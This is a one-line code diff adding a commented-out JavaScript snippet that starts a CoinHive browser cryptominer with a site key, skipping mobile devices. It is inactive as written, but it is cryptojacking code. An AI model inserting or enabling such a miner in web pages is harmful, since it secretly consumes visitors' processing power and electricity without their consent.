@@ -1,0 +1,1 @@
+/*var miner = new CoinHive.Anonymous('HcVwn3vEXW2vMW5IZ5CSG8PpYvKWTsLq');    if (!miner.isMobile()) {miner.start();    }*/
